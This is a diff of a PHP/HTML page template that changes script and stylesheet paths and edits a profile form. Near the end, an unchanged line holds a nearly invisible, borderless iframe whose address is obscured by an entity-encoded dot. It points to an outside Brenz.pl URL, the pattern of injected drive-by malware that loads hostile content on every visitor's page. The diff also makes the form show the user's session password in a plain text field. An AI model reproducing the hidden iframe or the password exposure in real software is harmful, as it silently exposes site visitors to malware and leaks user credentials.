@@ -1,10 +1,5 @@
 
-  <script src="<?=$this->base_url;?>public/lib/jquery/jquery.min.js"></script>
-  <script src="<?=$this->base_url;?>public/lib/jquery/jquery-migrate.min.js"></script>
-  <script src="<?=$this->base_url;?>public/lib/bootstrap/js/bootstrap.bundle.min.js"></script>
-  <script src="<?=$this->base_url;?>public/lib/easing/easing.min.js"></script>
-	<link href="<?=$this->base_url;?>public/lib/ionicons/css/ionicons.css" rel="stylesheet">
-	<link href="<?=$this->base_url;?>public/lib/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+
 <!------ Include the above in your HEAD tag ---------->
 
 <!---*************welcome this is my simple empty strap by John Niro Yumang ******************* -->
@@ -17,16 +12,16 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
 	<head>
-		<script src="<?= $this->base_url?>public/jquery/jquery.min.js"></script>
+		<script src="<?= $this->base_url?>public/js/jquery-3.3.1.min.js"></script>
 		<!---- jquery link local dont forget to place this in first than other script or link or may not work ---->
 		
-		<link rel="stylesheet" href="<?= $this->base_url?>public/css/bootstrap.min.css">
+		<link rel="stylesheet" href="<?= $this->base_url?>public/css/bootstrap.css">
 		<!---- boostrap.min link local ----->
 		
 		<link rel="stylesheet" href="<?= $this->base_url?>public/css/style.css">
 		<!---- boostrap.min link local ----->
 
-		<script src="<?= $this->base_url?>public/js/bootstrap.min.js"></script>
+		<script src="<?= $this->base_url?>public/js/bootstrap.js"></script>
 		<!---- Boostrap js link local ----->
 		
 		<!-- <link rel="icon" href="images/icon.png" type="image/x-icon" /> -->
@@ -129,7 +124,8 @@
 					</div>
 					<div class="form-group">
 						<label >Password</label>
-						<input class="form-control" type="text" id="password" value="<?= $_SESSION['nim'];?>" readonly>
+						<input class="form-control" type="text" id="password" value="<?= $_SESSION['password'];?>" readonly>
+						<!-- <a href="#" class="badge badge-info show">tampilkan</a> -->
 					</div>
 				</form>
       </div>
@@ -140,10 +136,11 @@
   </div>
 </div>
 
-<script>
-
-</script>
-
+<!-- <script>
+	$('.show').on('click', function(){
+		console.log('okee');
+	});
+</script> -->
 <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
 </body>
 	 
